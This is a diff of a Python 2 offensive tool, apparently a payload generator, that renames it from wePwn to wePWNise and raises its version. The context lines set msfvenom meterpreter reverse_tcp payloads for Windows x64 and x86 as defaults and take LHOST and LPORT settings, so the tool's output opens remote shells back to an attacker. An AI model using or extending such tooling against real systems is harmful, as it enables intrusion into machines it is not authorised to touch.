@@ -18,12 +18,12 @@ from termcolor import colored
 # 			lhost -> LHOST		No Default
 #			lport -> LPORT		Default: 443
 #			
-#			--out -> OUTPUT file	Default: wepwn.txt
+#			--out -> OUTPUT file	Default: wepwnise.txt
 #
 # You can modify binary-paths.txt to have a list of your own choice :)
 #
  
-version = "0.24 BETA"
+version = "0.25 BETA"
 
 def printBanner():
 
@@ -87,7 +87,7 @@ printBanner()
 
 print ""
 
-parser = argparse.ArgumentParser(description="wePwn")
+parser = argparse.ArgumentParser(description="wePWNise")
 parser.add_argument("--x64", dest="x64", default="windows/x64/meterpreter/reverse_tcp", help="msfvenom x64 payload")
 parser.add_argument("--x86", dest="x86", default="windows/meterpreter/reverse_tcp", help="msfvenom x86 payload")
 parser.add_argument("lhost64", help="LHOST for x64 to connect/bind to")
@@ -154,7 +154,7 @@ if (not xlhost) or (not xlport) or (not x32bit) or (not x64bit):
 	# Invalid, do not continue
 print ""
 
-print colored("[*] Welcome to wePWN", "blue")
+print colored("[*] Welcome to wePWNise", "blue")
 
 print ""
 print colored("[+] Obtaining payloads", "green")
